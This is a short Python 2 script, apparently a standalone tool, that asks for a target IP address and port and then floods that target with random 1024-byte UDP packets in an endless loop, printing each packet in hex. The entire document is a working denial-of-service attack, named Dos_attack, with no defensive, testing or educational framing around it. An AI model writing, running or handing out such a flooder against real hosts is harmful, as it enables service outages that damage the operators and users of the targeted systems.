import socket
import random
IP = raw_input('IP : ')
port = input('port : ')
def Dos_attack(IP, port):
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
packet = random._urandom(1024)
while True :
sock.sendto(packet,(IP,port))
print (packet.encode('hex'))
Dos_attack(IP, port)
